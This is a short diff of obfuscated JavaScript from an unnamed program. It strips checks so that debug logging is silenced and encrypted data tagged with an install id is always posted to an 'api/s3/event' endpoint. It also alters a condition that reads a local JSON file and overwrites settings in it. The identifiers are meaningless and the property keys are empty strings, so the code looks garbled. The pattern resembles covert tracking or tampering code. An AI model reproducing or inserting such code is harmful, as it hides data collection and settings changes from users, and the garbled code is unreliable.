@@ -981,7 +981,7 @@
       co.n4EBPL8 = [166, ''];
       const cp = class dr {
         static s59BT06(ds, dt = 0) {
-          if (!cj.S559FZQ.F40E8E7) {
+          {
             return;
           }
           console.log('[' + dt + "]: " + ds);
@@ -1031,7 +1031,7 @@
           params.append("data", ej.data);
           params.append("iv", ej.iv);
           params.append("iid", eh);
-          if (!cj.S559FZQ.F40E8E7) {
+          {
             await cv("api/s3/event", params);
           }
         }
@@ -2962,7 +2962,7 @@
           try {
             let data9 = JSON.parse(fs11.readFileSync(vc, "utf8"));
             const vd = await this.g4EE56L("wv-key");
-            if (data9[""] ?? true || (data9[""]?.[""] ?? true) || (data9[""] ?? true) || (data9[""] ?? true)) {
+            if (data9[""] ?? true || (false ?? true) || (data9[""] ?? true) || (data9[""] ?? true)) {
               if (0 == vd || va) {
                 await this.D45AYQ3("");
                 data9[""] = false;
